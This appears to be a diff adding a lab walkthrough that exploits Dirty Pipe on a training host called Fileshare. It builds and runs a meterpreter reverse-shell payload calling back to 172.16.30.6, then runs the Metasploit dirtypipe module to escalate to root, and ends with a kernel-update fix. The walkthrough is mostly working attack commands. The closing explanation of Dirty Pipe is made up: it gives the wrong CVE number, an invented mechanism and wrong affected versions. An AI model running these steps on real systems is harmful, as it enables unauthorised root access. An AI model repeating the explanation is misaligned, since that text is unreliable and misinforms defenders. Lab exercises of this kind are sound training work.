@@ -1,0 +1,45 @@
+1. On Security-Desk, in a terminal, run the following command to generate a listener:
+msfvenom --platform linux -p linux/x64/meterpreter_reverse_tcp LHOST=172.16.30.6 LPORT=4444 -f elf -o listener.bin
+
+2. Copy that executable to Fileshare:
+scp listener.bin playerone@172.16.30.32:/home/playerone
+
+3. On Fileshare, make the listener executable and run it:
+chmod +x /home/playerone/listener.bin && /home/playerone/listener.bin
+
+4. On Security-Desk, launch the metasploit console:
+sudo msfconsole
+
+5. Within the metasploit console, enter the following commands to create a meterpreter session that will be used to run the exploit (each line is a separate command):
+
+use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_tcp
+set LHOST 172.16.30.6
+run
+getuid
+
+Notice the user ID displayed will be listed as "Server username: playerone"
+
+6. Within the metasploit console, enter the following commands to run the exploit over the previously generated meterpreter session (each line is a separate command):
+NOTE: for the command 'set session', use 'sessions -l' to find the proper session ID, substituting that value for '1' if it is different.
+
+background
+use exploit/linux/local/cve_2022_0847_dirtypipe
+set LHOST 172.16.30.6
+set session 1
+run
+getuid
+
+If 'Server username: root' is shown as output from the previous command 'getuid', privilege escalation has occurred.
+
+Suggested Fix:
+Update Fileshare's kernel to a version where Dirty Pipe vulnerability has been patched. Run the following commands on Fileshare:
+
+1. sudo apt install linux-image-amd64
+2. sudo reboot
+3. uname -v
+What is DirtyPIPE?
+The Dirty Pipe Linux CVE (CVE-2019-14287) is a privilege escalation vulnerability in the Linux kernel. It can be exploited by a local user to gain root privileges on the system without authentication. It occurs when a user calls the pipe() system call with a non-existent file descriptor. This causes the kernel to incorrectly initialize security context for the pipe, allowing the user to gain control of the kernel and perform privileged operations. It affects all versions of Linux from 2.6.31 to 5.2.17.
+How the mitigation works?
+
+To mitigate this vulnerability, it is recommended to update your system to the latest version of the Linux kernel. Additionally, you should restrict access to the pipe() system call to only privileged users. You should also monitor the system for any suspicious activity, such as unusually high CPU or memory usage. Finally, you should consider applying additional security measures such as SELinux or AppArmor to further protect the system.
